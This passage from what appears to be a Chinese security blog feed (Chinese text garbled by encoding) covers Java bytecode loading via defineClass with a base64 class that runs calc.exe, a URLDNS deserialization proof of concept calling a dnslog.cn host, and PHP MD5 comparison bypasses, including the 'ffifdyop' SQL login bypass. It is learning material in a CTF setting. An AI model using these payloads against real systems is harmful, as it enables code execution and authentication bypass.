class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.ClassLoader&quot;</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">defineClass</span> <span class="hljs-operator">=</span> aClass.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);<br>        defineClass.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] decode = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAHwoABgASCgATABQIABUKABMAFgcAFwcAGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAMTHhzdzZhL0Vpdmw7AQAKRXhjZXB0aW9ucwcAGQEAClNvdXJjZUZpbGUBAAlFaXZsLmphdmEMAAcACAcAGgwAGwAcAQAIY2FsYy5leGUMAB0AHgEACnhzdzZhL0VpdmwBABBqYXZhL2xhbmcvT2JqZWN0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAEAAQAHAAgAAgAJAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAGAAQABwANAAgACwAAAAwAAQAAAA4ADAANAAAADgAAAAQAAQAPAAEAEAAAAAIAEQ==&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">evil</span> <span class="hljs-operator">=</span>(Class) defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="hljs-string">&quot;xsw6a.Eivl&quot;</span>, decode, <span class="hljs-number">0</span>, decode.length);<br>        evil.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯å‘¢ï¼Ÿè¿™ä¸ª<code>defineClass</code>ä½œç”¨åŸŸè¢«<code>protect</code>é™åˆ¶äº†ã€‚æ— æ³•åœ¨å¤–éƒ¨è®¿é—®ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012018186.png" alt="QQæˆªå›¾20220301201752"></p><p>å¾ˆå·§çš„æ˜¯<strong>Templateslmp</strong>å´è°ƒç”¨äº†defineClassæ–¹æ³•ã€‚<br>ä¸‹é¢ç»§ç»­å¤ä¹ <strong>Templateslmpçš„åˆ©ç”¨</strong>ã€‚å…¶å®æœ¬æ¬¡è®²çš„éƒ½æ˜¯é“ºå«ã€‚æˆ‘ä¹Ÿå°±æ²¡æœ‰è·Ÿè¿›å»è°ƒè¯•ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>URLDNSé“¾</title>
    <link href="/2022/03/01/URLDNS%E9%93%BE/"/>
    <url>/2022/03/01/URLDNS%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="URLDNSé“¾"><a href="#URLDNSé“¾" class="headerlink" title="URLDNSé“¾"></a>URLDNSé“¾</h1><h2 id="ä½œç”¨"><a href="#ä½œç”¨" class="headerlink" title="ä½œç”¨"></a>ä½œç”¨</h2><p>è¯¥é“¾å­å¸¸é…åˆdnslogå»éªŒè¯æ˜¯å¦å­˜åœ¨ååºåˆ—åŒ–ï¼ˆå› ä¸ºè¯¥é“¾å­ä¸å—jdkç‰ˆæœ¬é™åˆ¶ï¼Œä¸”åªä¾èµ–åŸç”Ÿç±»ã€‚ï¼‰</p><h2 id="åˆ©ç”¨é“¾"><a href="#åˆ©ç”¨é“¾" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap.readObject()<br>    HashMap.putVal()<br>        HashMap.hash()<br>            URL.hashCode()<br></code></pre></td></tr></table></figure><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><h3 id="HashMapä¸ºä»€ä¹ˆè‡ªå·±å®ç°äº†writeObjectï¼ˆï¼‰å’ŒreadObjectï¼ˆï¼‰"><a href="#HashMapä¸ºä»€ä¹ˆè‡ªå·±å®ç°äº†writeObjectï¼ˆï¼‰å’ŒreadObjectï¼ˆï¼‰" class="headerlink" title="HashMapä¸ºä»€ä¹ˆè‡ªå·±å®ç°äº†writeObjectï¼ˆï¼‰å’ŒreadObjectï¼ˆï¼‰"></a>HashMapä¸ºä»€ä¹ˆè‡ªå·±å®ç°äº†writeObjectï¼ˆï¼‰å’ŒreadObjectï¼ˆï¼‰</h3><p>é¦–å…ˆæ˜ç™½ä¸€ç‚¹ã€‚å¦‚æœååºåˆ—åŒ–è¯¥ç±»çš„æ—¶å€™ï¼Œè¯¥ç±»å®ç°äº†writeObjectï¼ˆï¼‰å’ŒreadObjectï¼ˆï¼‰ï¼Œå°±ä¼šæ‰§è¡Œè¯¥ç±»çš„è¿™ä¸¤ç±»æ–¹æ³•ã€‚</p><p>è·Ÿç€åˆ©ç”¨é“¾æ¥åˆ†æã€‚</p><h3 id="HashMap-readObject"><a href="#HashMap-readObject" class="headerlink" title="HashMap.readObject()"></a>HashMap.readObject()</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span><br>        s.defaultReadObject();<br>        reinitialize();<br>        <span class="hljs-keyword">if</span> (loadFactor &lt;= <span class="hljs-number">0</span> || Float.isNaN(loadFactor))<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Illegal load factor: &quot;</span> +<br>                                             loadFactor);<br>        s.readInt();                <span class="hljs-comment">// Read and ignore number of buckets</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">mappings</span> <span class="hljs-operator">=</span> s.readInt(); <span class="hljs-comment">// Read number of mappings (size)</span><br>        <span class="hljs-keyword">if</span> (mappings &lt; <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Illegal mappings count: &quot;</span> +<br>                                             mappings);<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mappings &gt; <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// (if zero, use defaults)</span><br>            <span class="hljs-comment">// Size the table using given load factor only if within</span><br>            <span class="hljs-comment">// range of 0.25...4.0</span><br>            <span class="hljs-type">float</span> <span class="hljs-variable">lf</span> <span class="hljs-operator">=</span> Math.min(Math.max(<span class="hljs-number">0.25f</span>, loadFactor), <span class="hljs-number">4.0f</span>);<br>            <span class="hljs-type">float</span> <span class="hljs-variable">fc</span> <span class="hljs-operator">=</span> (<span class="hljs-type">float</span>)mappings / lf + <span class="hljs-number">1.0f</span>;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">cap</span> <span class="hljs-operator">=</span> ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?<br>                       DEFAULT_INITIAL_CAPACITY :<br>                       (fc &gt;= MAXIMUM_CAPACITY) ?<br>                       MAXIMUM_CAPACITY :<br>                       tableSizeFor((<span class="hljs-type">int</span>)fc));<br>            <span class="hljs-type">float</span> <span class="hljs-variable">ft</span> <span class="hljs-operator">=</span> (<span class="hljs-type">float</span>)cap * lf;<br>            threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?<br>                         (<span class="hljs-type">int</span>)ft : Integer.MAX_VALUE);<br>            <span class="hljs-meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span><br>                Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>[cap];<br>            table = tab;<br><br>            <span class="hljs-comment">// Read the keys and values, and put the mappings in the HashMap</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) s.readObject();<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V) s.readObject();<br>                putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>ä»£ç éå¸¸é•¿ï¼Œè¿™é‡Œåªè¯´å…³é”®çš„éƒ¨åˆ†ï¼ˆ<code>readObjectï¼ˆï¼‰</code>éƒ¨åˆ†ï¼‰ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203010002478.png" alt="QQæˆªå›¾20220228232632"></p><p>è·Ÿè¿›<code>hashï¼ˆkeyï¼‰!</code><br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203010002791.png" alt="QQæˆªå›¾20220228232754"></p><p>è¿™é‡Œreturnäº†<code>key.hashCode</code>ï¼Œé‚£ä¹ˆå“ªä¸ªç±»åˆè°ƒç”¨äº†<code>hashCode</code>å‘¢ï¼Ÿ</p><p>è·Ÿç€åˆ©ç”¨é“¾åˆ†æï¼Œè¿™é‡Œçš„URLç±»ä½¿ç”¨äº†<code>hashcode</code></p><h3 id="URL-hashCode"><a href="#URL-hashCode" class="headerlink" title="URL.hashCode()"></a>URL.hashCode()</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203010002555.png" alt="QQæˆªå›¾20220228233214"></p><p>è·Ÿè¿›è¿™é‡Œçš„<code>hashCode</code>ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203010002994.png" alt="QQæˆªå›¾20220228233327"></p><p>è¿™é‡Œå°±è§¦å‘äº†è®¿é—®dnslogã€‚</p><h3 id="æ³¨æ„ç‚¹"><a href="#æ³¨æ„ç‚¹" class="headerlink" title="æ³¨æ„ç‚¹"></a>æ³¨æ„ç‚¹</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UrlDnsDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MalformedURLException, NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://xen3dy.dnslog.cn&quot;</span>);<br>        url.hashCode();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸Šé¢çš„è¿™ä¸ªä»£ç ä¼šä¸ä¼šè§¦å‘dnslogå‘¢ï¼Ÿç­”æ¡ˆæ˜¯ä¼šã€‚è·Ÿè¿›å»çœ‹çœ‹ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203010002986.png" alt="QQæˆªå›¾20220228234601"></p><p>åŒæ ·ä¼šå¾€ä¸‹èµ°,æ¥ç€è§¦å‘<code>getHsotAddress()</code>ã€‚é‚£å¦‚æœæ˜¯è¿™æ ·åœ¨åºåˆ—åŒ–çš„æ—¶å€™å°±å¯ä»¥è§¦å‘dnslogäº†ï¼Œæ ¹æœ¬åœ¨å®æˆ˜ä¸­ä¹Ÿèµ·ä¸åˆ°éªŒè¯çš„ä½œç”¨ã€‚<br>é‚£ä¹ˆæ¥ä¸‹æ¥æˆ‘ä»¬å°±è¦å»ä¿®æ”¹è¿™ä¸ª<code>hashCode</code>çš„å€¼ã€‚æ€æ ·ä¿®æ”¹å‘¢ï¼Ÿå…ˆæ¥çœ‹çœ‹<code>hashCode</code>æ˜¯ä»€ä¹ˆå±æ€§å§ï¼Ÿ<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203010002790.png" alt="QQæˆªå›¾20220228235155"></p><p>å°±åå°„ä¿®æ”¹è¯¥å±æ€§ã€‚</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UrlDns</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://u5gnvq.dnslog.cn&quot;</span>);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">urlClass</span> <span class="hljs-operator">=</span> URL.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">haseCode</span> <span class="hljs-operator">=</span> urlClass.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        haseCode.setAccessible(<span class="hljs-literal">true</span>);<br>        haseCode.set(url, <span class="hljs-number">2213</span>);<br><br>        hashMap.put(url, <span class="hljs-number">1</span>);<br><br>        haseCode.set(url, -<span class="hljs-number">1</span>);<br><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(hashMap);<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å…³äºMD5</title>
    <link href="/2022/02/28/%E5%85%B3%E4%BA%8EMD5/"/>
    <url>/2022/02/28/%E5%85%B3%E4%BA%8EMD5/</url>
    
    <content type="html"><![CDATA[<h1 id="å…³äºMD5"><a href="#å…³äºMD5" class="headerlink" title="å…³äºMD5"></a>å…³äºMD5</h1><h2 id="è¿ç®—ç¬¦"><a href="#è¿ç®—ç¬¦" class="headerlink" title="è¿ç®—ç¬¦"></a>è¿ç®—ç¬¦</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202282131963.png"></p><h2 id="â€²-x3D-x3D-â€²"><a href="#â€²-x3D-x3D-â€²" class="headerlink" title="â€²&#x3D;&#x3D;â€²"></a>â€²&#x3D;&#x3D;â€²</h2><p>ä¼šå…ˆå°†å­—ç¬¦ä¸²æ¢æˆç›¸åŒç±»å‹ï¼Œå†ä½œæ¯”è¾ƒï¼Œå±äºå¼±ç±»å‹æ¯”è¾ƒã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-number">1</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;1aaa500&#x27;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>==<span class="hljs-variable">$b</span>);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202282131909.png"></p><h2 id="â€²-x3D-x3D-x3D-â€²"><a href="#â€²-x3D-x3D-x3D-â€²" class="headerlink" title="â€²&#x3D;&#x3D;&#x3D;â€²"></a>â€²&#x3D;&#x3D;&#x3D;â€²</h2><p>ä¼šåŒæ—¶æ¯”è¾ƒå­—ç¬¦ä¸²çš„å€¼å’Œç±»å‹ã€‚ï¼ˆä¸ä¸€ä¸€éªŒè¯ï¼‰ã€‚</p><h2 id="md5å¼±æ¯”è¾ƒ"><a href="#md5å¼±æ¯”è¾ƒ" class="headerlink" title="md5å¼±æ¯”è¾ƒ"></a>md5å¼±æ¯”è¾ƒ</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]!=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]&amp;&amp;<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>])==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Xsw6a_a&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">a</span>=QNKCDZO&amp;b=aabg7XSs<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202282131242.png" alt="QQæˆªå›¾20220227222344"></p><p>è¿™é‡Œçš„ä¸¤ä¸ªaï¼Œbã€‚åœ¨MD5åŠ å¯†åå˜æˆå‡ä¸º0eå¼€å¤´çš„å­—ç¬¦ä¸²ï¼Œè€Œåˆé€šè¿‡å¼±ç±»å‹æ¯”è¾ƒå˜ä¸º0&#x3D;0ã€‚</p><h2 id="md5å¼ºæ¯”è¾ƒ"><a href="#md5å¼ºæ¯”è¾ƒ" class="headerlink" title="md5å¼ºæ¯”è¾ƒ"></a>md5å¼ºæ¯”è¾ƒ</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]!==<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]&amp;&amp;<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>])===<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Xsw6a&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202282131276.png" alt="QQæˆªå›¾20220227222810"></p><p><strong>md5å¼ºæ¯”è¾ƒï¼Œæ­¤æ—¶å¦‚æœä¼ å…¥çš„ä¸¤ä¸ªå‚æ•°ä¸æ˜¯å­—ç¬¦ä¸²ï¼Œè€Œæ˜¯æ•°ç»„ï¼Œmd5()å‡½æ•°æ— æ³•è§£å‡ºå…¶æ•°å€¼ï¼Œè€Œä¸”ä¸ä¼šæŠ¥é”™ï¼Œå°±ä¼šå¾—åˆ°&#x3D;&#x3D;&#x3D;å¼ºæ¯”è¾ƒçš„å€¼ç›¸ç­‰</strong></p><h2 id="ç‰¹å®šæ¡ä»¶ä¸‹çš„MDéªŒè¯ç»•è¿‡"><a href="#ç‰¹å®šæ¡ä»¶ä¸‹çš„MDéªŒè¯ç»•è¿‡" class="headerlink" title="ç‰¹å®šæ¡ä»¶ä¸‹çš„MDéªŒè¯ç»•è¿‡"></a>ç‰¹å®šæ¡ä»¶ä¸‹çš„MDéªŒè¯ç»•è¿‡</h2><p>ä¹‹å‰å°±æ˜¯æœ‰ä¸€é“é¢˜åˆ·åˆ°è¿‡ã€‚ä¹Ÿæ˜¯åœ¨buuctfä¸Šã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">Select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> â€™adminâ€™ <span class="hljs-keyword">where</span> password<span class="hljs-operator">=</span>md5($pass,<span class="hljs-literal">true</span>)<br></code></pre></td></tr></table></figure><p>MD5æŠ¥æ–‡å°†ä»¥åŸå§‹ 16å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼è¿”å›</p><p><strong>ffifdyop å­—ç¬¦ä¸²ç»è¿‡MD5åŠ å¯†åä¸º276f722736c95d99e921722cf9ed621c</strong><br><strong>åœ¨è½¬æ¢æˆå­—ç¬¦ä¸²ä¸ºâ€™orâ€™6ä¹±ç </strong></p><p>Select * from â€™adminâ€™ where password&#x3D;â€˜orâ€™6ä¹±ç <br><strong>ç›¸å½“äºä¸‡èƒ½å¯†ç </strong></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202282131783.png" alt="QQæˆªå›¾20220227223725"></p><h2 id="md5å¼ºæ¯”è¾ƒï¼ˆé™åˆ¶å­—ç¬¦ä¸²ï¼‰"><a href="#md5å¼ºæ¯”è¾ƒï¼ˆé™åˆ¶å­—ç¬¦ä¸²ï¼‰" class="headerlink" title="md5å¼ºæ¯”è¾ƒï¼ˆé™åˆ¶å­—ç¬¦ä¸²ï¼‰"></a>md5å¼ºæ¯”è¾ƒï¼ˆé™åˆ¶å­—ç¬¦ä¸²ï¼‰</h2><h3 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]!==(<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]&amp;&amp;<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>])===<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Xsw6a&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>éœ€è¦ä½¿ç”¨ä½¿ç”¨md5åŠ å¯†åä¸¤ä¸ªå®Œå…¨ç›¸ç­‰çš„ä¸¤ä¸ªå­—ç¬¦ä¸²æ¥ç»•è¿‡è¿‡æ»¤ã€‚</strong><br>è¿™é‡Œå°±ä¸è¯¦ç»†è¯´äº†ã€‚ï¼ˆæˆ‘æ²¡æ€ä¹ˆçœ‹ï¼Œæˆ‘æ„Ÿè§‰åªè¦çŸ¥é“å°±è¡Œäº†ï¼‰</p><p>è¿™é‡Œæˆ‘æ˜¯çœŸæ²¡å¤ç°å‡ºæ¥ã€‚æˆ‘æ˜¯çœŸçš„ä¼šè°¢ï¼ï¼ï¼å¤ç°äº†ä¸€æ™šä¸ŠåŠ ä¸€ä¸‹åˆ+ç°åœ¨æ˜¯20.52åˆ†ã€‚æˆ‘çœŸçš„ä¼šè°¢ã€‚<br>ç»ˆäºå¤ç°å‡ºæ¥äº†ã€‚çœŸçš„ä¼šè°¢ã€‚<br><a href="https://segmentfault.com/a/1190000039189857">https://segmentfault.com/a/1190000039189857</a><br>è¿™æ˜¯ç”Ÿæˆå·¥å…·ã€‚æŒ‰ç…§ç”Ÿæˆä»£ç å°±è¡Œã€‚<br>æˆ‘ä¸€ç›´ä»¥ä¸ºæ˜¯æˆ‘çš„ä»£ç ç”Ÿæˆçš„æœ‰é—®é¢˜ã€‚è¯¢é—®<code>h3å¸ˆå‚…</code>æˆ‘æ˜¯çœŸæ²¡æƒ³åˆ°ä»–ä¸€ä¸‹å°±å¼„å‡ºæ¥äº†ã€‚ç„¶åä»–å°†payloadç»™äº†æˆ‘ï¼Œæˆ‘å¤ç°ä½†æ˜¯è¿˜æ˜¯ä¸è¡Œã€‚æˆ‘æ¢äº†å¾ˆå¤šphpç‰ˆæœ¬ï¼Œæœ€åè¿˜æ˜¯ä¸è¡Œã€‚</p><p>ç„¶åæœ€åç»è¿‡<code>å¤©ä¸Šæ˜Ÿ</code>å¸ˆå‚…çš„æé†’ï¼Œä¹Ÿè®¸æ˜¯æŠ“åŒ…çš„é—®é¢˜ï¼ˆæœ‰æ—¶å€™æŠ“åŒ…çš„æ—¶å€™ä¸èƒ½ç›´æ¥æ”¹æˆPOSTï¼‰ã€‚å¯æƒœæˆ‘æ²¡æœ‰åœ¨ç«ç‹é‡Œè£…<code>hackbar</code>ï¼Œç„¶åå°±åˆå»è£…ã€‚</p><p>æ¥ç€æˆ‘åˆå»è¯¢é—®<code>h3å¸ˆå‚…</code>åŸå› 